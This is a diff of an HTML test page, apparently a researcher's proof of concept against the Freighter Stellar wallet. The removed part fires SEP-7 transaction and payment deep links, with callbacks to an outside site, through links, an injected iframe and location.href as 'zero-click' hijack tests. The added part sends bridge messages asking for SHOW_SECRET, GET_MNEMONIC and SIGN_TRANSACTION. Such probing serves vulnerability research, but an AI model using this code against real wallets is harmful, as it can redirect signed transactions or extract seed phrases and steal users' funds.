@@ -1,53 +1,11 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>SEP-7 Hijack Test - 0x403for</title>
-<style>
-body{font-family:monospace;padding:14px;background:#000;color:#0f0}
-a.btn,button{display:block;padding:14px;margin:10px 0;background:#111;border:1px solid #0f0;color:#0f0;text-align:center;text-decoration:none;width:100%;font-size:13px;word-break:break-all}
-pre{background:#111;padding:8px;white-space:pre-wrap;font-size:11px}
-</style>
-</head>
-<body>
-<h2>SEP-7 Deep Link Test</h2>
-<p>Test ini HARUS dibuka di Safari iPhone (bukan di dalam Freighter)</p>
-
-<h3>1. web+stellar://tx with callback to evil site</h3>
-<small>XDR ini cuma payment 1 XLM dummy, bukan drain</small>
-<a class="btn" href="web+stellar:tx?xdr=AAAAAgAAAADc3f1v3R6J4qN7F7o7f7o7f7o7f7o7f7o7f7o7f7o7gAAAAMAAAAA7f1v3R6J4qN7F7o7f7o7f7o7f7o7f7o7gAAAAEAAAAA&callback=https://0x403for.github.io">web+stellar:tx + callback evil</a>
-
-<a class="btn" href="stellar:tx?xdr=AAAAAgAAAADc3f1v3R6J4qN7F7o7f7o7f7o7gAAAAMAAAAA7f1v3R6J4qN7F7o7f7o7f7o7f7o7f7o7f7o7f7o7f7o7f7o7f7o7f7o7f7o7f7o7gAAAAEAAAAA&callback=https://0x403for.github.io">stellar:tx + callback evil</a>
-
-<h3>2. Via JS iframe (0-click test)</h3>
-<button onclick="testIframe()">Test via iframe (0-click hijack?)</button>
-
-<h3>3. Via location.href (0-click test)</h3>
-<button onclick="testLocation()">Test via location.href (0-click hijack?)</button>
-
-<h3>4. Pay scheme combo</h3>
-<a class="btn" href="web+stellar:pay?destination=GBEVILTEST123456&amount=100&memo=HijackTest&callback=https://0x403for.github.io">web+stellar:pay + evil callback</a>
-
-<pre id="log"></pre>
-
 <script>
-const logEl = document.getElementById('log');
-function log(t){ logEl.innerText += t+'\n'; }
-const dummyXDR = "AAAAAgAAAADc3f1v3R6J4qN7F7o7f7o7f7o7f7o7gAAAAMAAAAA";
-
-function testIframe(){
-  log('Injecting iframe web+stellar:tx...');
-  let f = document.createElement('iframe');
-  f.src = 'web+stellar:tx?xdr='+dummyXDR+'&callback=https://0x403for.github.io';
-  document.body.appendChild(f);
-  log('Injected - if Freighter opens WITHOUT tap = 0-click Critical');
+function tryBridge(type){
+  let payload = JSON.stringify({type: type, id: 1, payload: {}});
+  window.ReactNativeWebView.postMessage(payload);
+  console.log('Sent: ' + payload);
 }
-function testLocation(){
-  log('location.href web+stellar:tx...');
-  location.href = 'web+stellar:tx?xdr='+dummyXDR+'&callback=https://0x403for.github.io';
-}
-log('Ready - '+new Date().toISOString()+'\nBuka file ini di SAFARI, bukan di Freighter');
 </script>
-</body>
-</html>
+<button onclick="tryBridge('SHOW_SECRET')">Test SHOW_SECRET</button>
+<button onclick="tryBridge('SIGN_TRANSACTION')">Test SIGN_TRANSACTION</button>
+<button onclick="tryBridge('GET_MNEMONIC')">Test GET_MNEMONIC</button>
+<button onclick="tryBridge('OPEN_SETTINGS')">Test OPEN_SETTINGS</button>
